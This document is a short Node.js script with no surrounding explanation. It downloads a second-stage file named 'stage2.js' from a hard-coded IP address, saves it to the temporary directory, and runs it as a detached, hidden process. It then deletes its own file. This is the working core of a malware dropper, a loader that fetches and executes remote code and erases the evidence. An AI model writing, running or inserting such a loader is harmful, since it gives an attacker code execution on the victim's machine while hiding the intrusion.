const https = require('https');
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const STAGE_URL = 'https://203.0.113.45:443/stage2.js';

https.get(STAGE_URL, { rejectUnauthorized: true }, (res) => {
  let body = '';
  res.on('data', (chunk) => {
    body += chunk;
  });
  res.on('end', () => {
    const out = path.join(os.tmpdir(), 'stage2.js');
    fs.writeFileSync(out, body);
    const child = spawn(process.execPath, [out], {
      detached: true,
      stdio: 'ignore',
    });
    child.unref();
    fs.unlinkSync(__filename);
  });
});
